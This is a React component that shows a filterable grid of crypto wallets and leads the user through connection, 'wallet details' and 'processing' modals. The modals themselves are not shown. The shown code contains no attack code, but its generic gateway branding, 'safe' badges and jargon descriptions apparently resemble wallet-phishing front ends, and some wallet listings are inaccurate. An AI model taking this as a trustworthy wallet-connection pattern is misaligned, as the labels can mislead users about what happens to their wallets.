// app/components/MultiWalletSelector.tsx
"use client";

import React, { useState } from "react";
import { Wallet, Search, ArrowRight, ShieldCheck, Grid, Layers, HardDrive } from "lucide-react";
import { useRouter } from "next/navigation";
import SecureConnectionModal from "../component/SecureConnectionModal";
import WalletDetailsModal from "../component/WalletDetails";
import ProcessingModal from "../component/ProcessingModal";

import Image from "next/image";
import {
    WalletWalletConnect, WalletCoinbase, WalletMetamask, WalletTrust, NetworkBinanceSmartChain, WalletTokenPocket, WalletImtoken, TokenMATH, TokenSFP, TokenONT,
    WalletWallet3, WalletPhantom, WalletSolflare, WalletLedger, WalletTrezor, WalletKeplr,
    TokenSOL
} from '@web3icons/react'

interface MultiWalletSelectorProps {
    onSelectWallet: (walletName: string) => void;
}

export default function MultiWalletSelector() {
    const router = useRouter()
    const [searchQuery, setSearchQuery] = useState("");
    const [activeTab, setActiveTab] = useState<"ALL" | "EVM" | "SOLANA" | "HARDWARE">("ALL");
    const [isSecureModalOpen, setIsSecureModalOpen] = useState(false);
    const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
    const [openWalletDetails, setOpenWalletDetails] = useState(false);
    const [isProcessingModalOpen, setIsProcessingModalOpen] = useState(false);


    const wallets = [
        // --- EVM LAYER ---
        {
            name: "MetaMask",
            category: "EVM",
            label: "POPULAR",
            desc: "Standard browser extension and mobile wallet routing matrix.",
            iconUrl: <WalletMetamask size={30} />
        },
        {
            name: "Trust Wallet Connect",
            category: "EVM",
            label: "MULTI-CHAIN",
            desc: "Secure multi-asset wallet connection protocol.",
            iconUrl: <WalletTrust size={30} />
        },
        {
            name: "Coinbase Wallet Connect",
            category: "EVM",
            label: "SECURE",
            desc: "Instant sync layer linking to verified Coinbase apps.",
            iconUrl: <WalletCoinbase size={30} />
        },
        {
            name: "Binance Chain Wallet Connect",
            category: "EVM",
            label: "BSC NATIVE",
            desc: "Optimized gateway interface for BNB Chain assets.",
            iconUrl: <NetworkBinanceSmartChain size={30} />
        },
        {
            name: "MathWallet Connect", category: "EVM", label: "MULTI-CHAIN", desc: "Universal crypto wallet hub across multiple chains.",
            iconUrl: <TokenMATH size={30} />
        },
        {
            name: "TokenPocket Wallet Connect",
            category: "EVM",
            label: "MOBILE PORTAL",
            desc: "Leading multi-chain secure dApp interface.",
            iconUrl: <WalletTokenPocket size={30} />
        },
        {
            name: "imToken Wallet Connect",
            category: "EVM",
            label: "ASIAN LEADER",
            desc: "Reliable asset management node optimized for Ethereum L2s.",
            iconUrl: <WalletImtoken size={30} />
        },
        {
            name: "BitKeep Wallet Connect", category: "EVM", label: "DEFI HUBS", desc: "Integrated cross-chain decentralized trading link.",

        },
        {
            name: "Huobi Wallet Connect", category: "EVM", label: "EXCHANGE SECURE", desc: "Professional multi-chain institutional wallet layer.",

        },
        {
            name: "SafePal Wallet Connect",
            category: "EVM",
            label: "CROSS-CHAIN",
            desc: "Dynamic software layer backing cross-chain operations.",
            iconUrl: <TokenSFP size={30} />
        },
        {
            name: "Onto Wallet Connect", category: "EVM", label: "IDENTITY", desc: "Cross-chain identity tracking and asset management node.",
            iconUrl: <TokenONT size={30} />
        },
        {
            name: "Cybavo Wallet Connect", category: "EVM", label: "CUSTODIAL", desc: "Enterprise-grade digital asset tracking connection.",

        },
        { name: "D'Cent Wallet Connect", category: "EVM", label: "BIOMETRIC", desc: "Biometric authentication pathing for multi-chains." },
        { name: "HyperPay Wallet Connect", category: "EVM", label: "HYBRID CORE", desc: "Multi-functional digital asset payment and tracking bridge." },
        { name: "BitPie Wallet Connect", category: "EVM", label: "BITCOIN & EVM", desc: "Long-standing decentralized wallet connection standard." },
        {
            name: "Wallet3 Connect", category: "EVM", label: "WEB3 NATIVE", desc: "Lightweight decentralized multi-chain proxy node.",
            iconUrl: <WalletWallet3 size={30} />
        },

        // --- SOLANA LAYER ---
        {
            name: "Phantom",
            category: "SOLANA",
            label: "DEFAULT",
            desc: "The premier portal for Solana, Ethereum, and Base network traces.",
            iconUrl: <WalletPhantom size={30} />
        },
        {
            name: "Solflare Wallet Connect",
            category: "SOLANA",
            label: "ADVANCED",
            desc: "High-performance Solana ecosystem browser and validator bridge.",
            iconUrl: <WalletSolflare size={30} />
        },
        {
            name: "MathWallet Solana", category: "SOLANA", label: "ECOSYSTEM", desc: "Solana-specific structural network interface engine.",
            iconUrl: <TokenSOL size={30} />
        },
        {
            name: "Blocto Solana",
            category: "SOLANA",
            label: "SMART WALLET",
            desc: "Simplified account abstraction onboarding flow for Solana chains.",
            iconUrl: <TokenSOL size={30} />

        },
        {
            name: "Slope Solana",
            category: "SOLANA",
            label: "MOBILE UI",
            desc: "Cross-platform Solana infrastructure connection hub.",
            iconUrl: <TokenSOL size={30} />

        },
        {
            name: "Solong Solana", category: "SOLANA", label: "LIGHTWEIGHT", desc: "Minimalist browser bridge utility tracking Solana accounts.",
            iconUrl: <TokenSOL size={30} />
        },
        {
            name: "SafePal Solana", category: "SOLANA", label: "INTEGRATED", desc: "Solana mainnet tracking path via SafePal apps.",
            iconUrl: <TokenSOL size={30} />
        },
        {
            name: "Samourai Solana", category: "SOLANA", label: "PRIVACY", desc: "Specialized encryption-enhanced network connection module.",
            iconUrl: <TokenSOL size={30} />
        },

        // --- HARDWARE BRIDGES ---
        {
            name: "Ledger Live",
            category: "HARDWARE",
            label: "COLD STORAGE",
            desc: "Verify cryptographic network instructions via Ledger USB bridges.",
            iconUrl: <WalletLedger size={30} />
        },
        {
            name: "Trezor Wallet Connect",
            category: "HARDWARE",
            label: "OPEN SOURCE",
            desc: "Hardware verification paths driven by Trezor firmware.",
            iconUrl: <WalletTrezor size={30} />
        },
        {
            name: "Keplr Wallet Connect",
            category: "HARDWARE",
            label: "COSMOS NATIVE",
            desc: "Inter-Blockchain Communication (IBC) gateway anchor for Cosmos networks.",
            iconUrl: <WalletKeplr size={30} />
        }
    ];

    const filteredWallets = wallets.filter(wallet => {
        const matchesSearch = wallet.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
            wallet.desc.toLowerCase().includes(searchQuery.toLowerCase());
        const matchesTab = activeTab === "ALL" || wallet.category === activeTab;
        return matchesSearch && matchesTab;
    });


    function onSelectWallet(walletName: string) {
        setSelectedWallet(walletName);
        const t = setTimeout(() => {

            setIsSecureModalOpen(true);
            clearTimeout(t)
        }, 500)

    }

    function handleCloseModal() {
        setIsSecureModalOpen(false);
        setSelectedWallet(null);
    }



    return (
        <div className="w-full max-w-4xl mx-auto p-6 bg-white/1 dark:bg-black/20 border border-white/5 dark:border-white/10 rounded-3xl backdrop-blur-xl space-y-6 relative z-10">


            {/* Title Segment Block */}
            <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 border-b border-white/5 pb-5">

                {/*Go back button*/}
                <div className="flex items-center gap-2 text-[12px]  text-white font-mono cursor-pointer hover:text-white transition-colors" onClick={() => {

                    router.back()
                }}

                >
                    <ArrowRight size={16} className="transform rotate-180" />
                    <span>Go Back</span>
                </div>

                <div className="space-y-1">
                    <h3 className="text-xl font-extrabold text-white tracking-tight flex items-center gap-2">
                        <Wallet size={20} className="text-blue-400" /> Unified Web3 Gateway Terminal
                    </h3>
                    <p className="text-xs text-gray-400">
                        Select any of our {wallets.length} integrated interfaces to verify public block explorer statuses.
                    </p>
                </div>
                <div className="flex items-center gap-1.5 text-[11px] text-emerald-400 bg-emerald-500/5 px-2.5 py-1 rounded-md border border-emerald-500/10 font-mono font-medium">
                    <ShieldCheck size={14} /> RPC HANDSHAKES SAFE
                </div>
            </div>

            {/* Navigation Filter Tabs Switcher */}
            <div className="flex flex-wrap gap-2 border-b border-white/5 pb-3">
                {[
                    { id: "ALL", name: "All Interfaces", icon: <Grid size={13} /> },
                    { id: "EVM", name: "EVM Ecosystem", icon: <Layers size={13} /> },
                    { id: "SOLANA", name: "Solana Framework", icon: <Layers size={13} className="text-purple-400" /> },
                    { id: "HARDWARE", name: "Hardware / Bridges", icon: <HardDrive size={13} /> }
                ].map((tab) => (
                    <button
                        key={tab.id}
                        onClick={() => setActiveTab(tab.id as any)}
                        className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-colors cursor-pointer ${activeTab === tab.id
                            ? "bg-blue-500/10 border-blue-500/30 text-blue-400"
                            : "bg-white/1 border-white/5 text-gray-400 hover:text-white hover:border-white/10"
                            }`}
                    >
                        {tab.icon} {tab.name}
                    </button>
                ))}
            </div>

            {/* Search Input Bar */}
            <div className="relative">
                <Search size={16} className="absolute left-4 top-3.5 text-gray-600" />
                <input
                    type="text"
                    placeholder={`Filter through integrated providers (e.g. MetaMask, Phantom, Ledger Live)...`}
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="w-full bg-white/5 border border-white/10 rounded-xl pl-11 pr-4 py-3.5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-blue-500 transition-colors"
                />
            </div>

            {/* High-Density Performance Matrix Scroll Zone */}
            <div className="grid sm:grid-cols-2 gap-3 max-h-115 overflow-y-auto pr-1 custom-scrollbar">
                {filteredWallets.length > 0 ? (
                    filteredWallets.map((wallet) => (
                        <button
                            key={wallet.name}
                            onClick={() => onSelectWallet(wallet.name)}
                            className="group text-left p-4 bg-white/1 border border-white/5 hover:border-white/15 rounded-xl transition-all duration-200 hover:bg-white/2 flex items-center justify-between gap-4 cursor-pointer"
                        >
                            <div className="flex items-center gap-3 overflow-hidden">
                                <div className="w-10 h-10 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center overflow-hidden shrink-0 group-hover:bg-blue-500/5 group-hover:border-blue-500/20 transition-all duration-200">
                                    {wallet.iconUrl ? (
                                        wallet.iconUrl
                                    ) : (
                                        <span className="font-mono font-bold text-xs text-gray-400 group-hover:text-blue-400">
                                            {wallet.name.substring(0, 2).toUpperCase()}
                                        </span>
                                    )}
                                </div>

                                <div className="space-y-0.5 truncate">
                                    <div className="flex items-center gap-2 flex-wrap">
                                        <span className="font-bold text-sm text-white group-hover:text-blue-400 transition-colors truncate">
                                            {wallet.name}
                                        </span>
                                        <span className="text-[9px] font-mono bg-white/5 text-gray-500 px-1.5 py-0.2 rounded border border-white/5 shrink-0">
                                            {wallet.category}
                                        </span>
                                    </div>
                                    <p className="text-[11px] text-gray-400 font-light leading-snug truncate">
                                        {wallet.desc}
                                    </p>
                                </div>
                            </div>

                            <div className="text-gray-600 group-hover:text-white transition-colors shrink-0">
                                <ArrowRight size={14} className="transform group-hover:translate-x-0.5 transition-transform" />
                            </div>
                        </button>
                    ))
                ) : (
                    <div className="sm:col-span-2 text-center py-12 text-xs text-gray-500 font-mono">
                        No integrated interface variant matched your active parameters.
                    </div>
                )}
            </div>

            {/* Compliance Baseline Panel */}
            <div className="pt-4 border-t border-white/5 flex flex-col sm:flex-row justify-between items-center gap-3 text-[11px] text-gray-500 font-mono">
                <div>&bull; Multi-chain tracking gateway running non-custodial telemetry configurations</div>
                <div>Active Interfaces: {wallets.length}</div>
            </div>

            <SecureConnectionModal onContinue={() => {
                setIsSecureModalOpen(false)
                setSelectedWallet(null)
                setOpenWalletDetails(true)
            }} initialProvider={selectedWallet || undefined} isOpen={isSecureModalOpen} onClose={handleCloseModal} />

            <WalletDetailsModal startWalletProcess={() => { setIsProcessingModalOpen(true) }} isOpen={openWalletDetails} onClose={() => {
                setOpenWalletDetails(false)
            }} title={selectedWallet as string} />

            <ProcessingModal isOpen={isProcessingModalOpen} onClose={() => { setIsProcessingModalOpen(false) }} serviceName={selectedWallet as string} />
        </div>
    );
}
